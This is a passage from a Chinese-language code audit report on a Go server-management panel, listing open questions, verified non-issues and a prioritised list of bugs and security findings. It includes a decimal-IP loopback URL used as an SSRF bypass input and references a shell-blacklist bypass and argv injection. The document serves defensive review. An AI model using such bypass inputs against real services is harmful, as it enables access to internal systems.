4. **`checkURLExternal` 对数字 IP（`http://2130706433/`）的实际解析结果（SEC-02）**：Go 的纯 Go resolver 与 cgo/glibc resolver 行为不同（是否走系统 resolver 由构建时的 `netgo`/`CGO_ENABLED` 决定）。**未能判定**：本项目未提供构建标签信息，无法确认生产二进制用的是哪个 resolver。
5. **面板进程的启动环境变量内容（SEC-05）**：无法从代码判断生产环境里是否真的把敏感值放进了 env（取决于 systemd unit / 启动脚本），代码层面只能确认"任务会继承全部 env"。
6. **`internal/api/misc.go` 的 WebSocket 日志推送在站点流量大时的表现**：只读到 `misc.go:195-235` 的骨架，未逐行审 `handleTail` 的鉴权与分页路径，不在本次模块范围内。

---

## 六、阴性结论（读过的文件里确认没问题的部分）

这些是为了避免"看起来可疑但其实是对的"而做的核对，同样重要：

| 模块 | 结论 |
|---|---|
| `internal/alert/checker.go:184-198`（site_down）+ `main.go:214-237` | **不再是空钩子**，默认实现与注入实现都做真实 HTTP 探测；`internal/alert/hooks_test.go:12-27` 锁死了这条链路。**未发现缺陷**（仅见 BUG-16 只探首域名）。 |
| `internal/alert/checker.go:243-260`（防篡改）+ `main.go:241-251` | **不再是空钩子**，注入实现调用 `svc.CheckTamper` 做真实比对；`hooks_test.go:31-57` 有回归。**未发现缺陷**（误报问题见 BUG-10）。 |
| `internal/alert/engine.go:139-256` 的四种渠道 | **真的发送**：webhook/dingtalk/wecom 都是真实 HTTP POST，email 走 `/usr/sbin/sendmail -t`（Linux）或 `sh -c "cat > /dev/null"` 兜底（非 Linux 开发机）。dingtalk 签名算法（`engine.go:192-211`，HMAC-SHA256 + base64 + `timestamp\nsecret`）与官方文档一致。**未发现签名实现缺陷**；投递失败无反馈见 BUG-14。 |
| `internal/alert/engine.go:367-387` 的配额单位 | 已修复：`checker.go:142-143` 统一换算成字节比较，与 `main.go:204-210` 注入的 `monthBytes` 口径一致。**未发现缺陷**。 |
| `internal/cron/handlers.go:367-387` 的 SSRF 之外的部分 | scheme 白名单（`handlers.go:372`）、method 白名单（`handlers.go:338`）都是对的。**问题只在地址校验不完整**（SEC-02）。 |
| `internal/cron/handlers.go:98-102` 的 PATH 处理 | Go 的 `os/exec.dedupEnv` 保留同名 key 的最后一次出现 ⇒ 追加在末尾的 PATH **确实生效**，不存在 PATH 劫持。**无缺陷**。 |
| `internal/backup/backup.go:220-259` 的备份原子性 | 先写 `.partial` 再 `os.Rename`（`backup.go:256`），失败路径都 `os.Remove(tmpPath)` ⇒ **不会留下半截备份文件**。**未发现缺陷**。 |
| `internal/backup/backup.go:228` 的 mysqldump 调用 | `exec.CommandContext(ctx, mysqldump, args...)` 无 shell，库名是独立 argv 元素 ⇒ **无命令注入**（仅 argv 注入，见 SEC-06）。 |
| `internal/acme/webroot.go` 的挑战文件路径 | `webroot.go:37` 严格遵循 ACME 规范 `/.well-known/acme-challenge/<token>`；token 由 CA 下发（base64url），不来自用户输入 ⇒ **无路径穿越**。 |
| `internal/acme/acme.go:246-263` 的 `firstLeafCert` | 循环里对解析失败的块会继续下一个，终止条件是 `block == nil` ⇒ **无死循环**。 |
| `internal/tlsgen/dummy.go:134-144` 的 `writeFile` | 先写 `.tmp` 再 `Chmod` 再 `Rename` ⇒ 单文件写入是原子的 ✅（但"证书+私钥"这一对不是原子的，且 `usable` 不校验配对 ⇒ 见 BUG-13）。 |
| `internal/logmgr/logmgr.go:100-151` 的"读末尾"改造 | seek 到尾部窗口再正读、反转、截断，逻辑正确（`logmgr.go:117-124`、`144-149`）—— **但被 BUG-20 的超长行问题抵消**。 |
| `internal/logmgr/logmgr.go:159-208` 的 `Tail` | EOF 后 300ms 轮询、启动 seek 到末尾、`sync.Once` 保证 stop 幂等（`logmgr.go:170`、`207`）⇒ **无 goroutine 泄漏**（`api/misc.go:222` 有 `defer stop()`）。 |
| `internal/acme/dns.go:34-90` 的 DNS provider 注册 | 4 个 provider 全部注册且可构造（`dns_test.go:8-29`、`75-86`）；刻意不注册 lego 的 `exec`/`httpreq` provider（`dns.go:31-33` 的注释说明了 RCE/SSRF 理由）⇒ **设计正确**。 |
| `internal/acme/acme.go:436-474` 的 `loadOrCreateKey` 并发 | 无锁，但只在建账户/首次签发时调用，**并发概率低**（真正的问题见 BUG-05 的"损坏即换钥"）。 |

---

## 七、优先级汇总（建议修复顺序）

**P1（建议立刻处理）**
1. SEC-01 —— shell 黑名单绕过（`dd` 未实现 + 6 类绕过手法）→ 整机 root 失守
2. BUG-01 —— 备份 `retain` 不删磁盘文件 → 磁盘泄漏
3. BUG-02 —— `log_split` 后 nginx 仍写归档文件 → 流量统计/5xx 告警失真 + 磁盘涨
4. BUG-03 —— 手动续签不重绑站点 → HTTPS 静默过期
5. BUG-04 —— 自动续签重复签发 → 撞 LE 限额，续签永久失败

**P2**
BUG-05（账户密钥被静默换掉）、BUG-06（整行回写覆盖用户修改）、BUG-07（"立即执行"被吞）、BUG-08（cron_runs 不清理）、BUG-09（5xx 窗口为 0 静默失效）、BUG-10（无基线误报篡改）、BUG-11（tamper_events 无限增长）、BUG-12（拒绝 cron 的 `7`）、BUG-13（证书私钥不校验配对）、BUG-14（投递失败无反馈）、BUG-20（超长日志行导致读到最旧记录）、BUG-21（失败输出不进历史）、SEC-02（access_url SSRF）、功能残缺 #1（全局告警不外发）、#2（无重试）、#3（无运行态）、#6（日志保留期未接线）、#9（签发无锁）、#10（ACME 无重试）、#11（删证书不删文件）

**P3**
BUG-15/16/17/18/19/22、SEC-04/05/06/07、功能残缺 #4/#5/#8/#12/#13/#14/#15/#16、Q-01 ~ Q-24
